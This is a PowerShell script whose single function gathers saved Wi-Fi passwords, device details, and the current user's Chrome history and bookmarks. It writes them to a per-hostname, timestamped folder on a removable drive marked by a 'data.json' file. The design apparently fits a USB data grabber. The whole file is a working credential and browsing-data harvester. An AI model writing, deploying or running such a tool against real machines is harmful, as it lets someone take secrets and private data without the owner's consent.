
function Extract() {
  param(
    [Alias("l")]
    [switch] $local
  )

  [decimal]$global:Total = 10
  [decimal]$global:Nth = 0

  function Write-ExtractionProgress([string]$Msg) {
    $Percentage = [System.Math]::Floor([decimal]($global:Nth / $Total * 100))
    $global:Nth = $global:Nth + 1
    write-progress "Extraction - $Msg" -perc $Percentage
  }
  function Find-ExternalOutputFolder() {
    $Drive = (Get-PSDrive -PSProvider FileSystem | Where-Object {[System.IO.File]::Exists($_.Root + "data.json")})[0]
    $Dir = $( $Drive.Root + "Out/" + @(Hostname) + "/" + (get-date -f MM-dd-yyyy_HH_mm_ss) + "/")
    return $Dir
  }

  Set-Alias -Name "prog" -Value "Write-ExtractionProgress"

  prog "Locating the output folder"

  $Dir = "./Extracted/"
  if (!$Local.IsPresent) {
    try {
      $Dir = Find-ExternalOutputFolder
    }
    Catch {
      Write-Warning "Cannot find an extraction drive. Falling back to extracting to a local file"
    }
  }
  $null = New-Item -ItemType directory -Path $Dir -Force

  # Extract Wi-Fi passwords
  prog "Extracting WiFi passwords"
  Get-WiFiPasswords | ConvertTo-Json | Out-File $Dir"Wi-Fi.json" -Force

  # Extract device info
  prog "Extracting device info"
  Get-DeviceInfo | ConvertTo-Json | Out-File $Dir"Device-Info.json" -Force

  prog "Extracting Chrome history and bookmarks"
  # Extract Chrome History And Bookmarks
  Copy-Item $Env:systemdrive"\Users\"$env:UserName"\AppData\Local\Google\Chrome\User Data\Default\History" -Destination $Dir"Chrome-History.db"
  Copy-Item $Env:systemdrive"\Users\"$env:UserName"\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" -Destination $Dir"Chrome-Bookmarks.json"

  prog "Done"
}